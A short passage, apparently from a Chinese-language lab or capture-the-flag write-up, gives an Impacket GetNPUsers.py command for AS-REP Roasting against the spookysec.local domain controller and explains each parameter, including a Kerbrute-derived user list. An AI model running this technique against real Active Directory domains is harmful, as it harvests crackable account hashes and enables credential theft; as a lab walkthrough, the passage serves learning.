



```bash
GetNPUsers.py spookysec.local/ -usersfile userlist.txt -no-pass -dc-ip 10.48.186.225
```

参数解释：

- `spookysec.local/`：目标域名，后面的斜杠不能省
- `-usersfile userlist.txt`：Kerbrute 枚举出来的有效用户名列表路径
- `-no-pass`：告诉工具不用提供密码（AS-REP Roasting 本来就不需要）
- `-dc-ip`：域控 IP
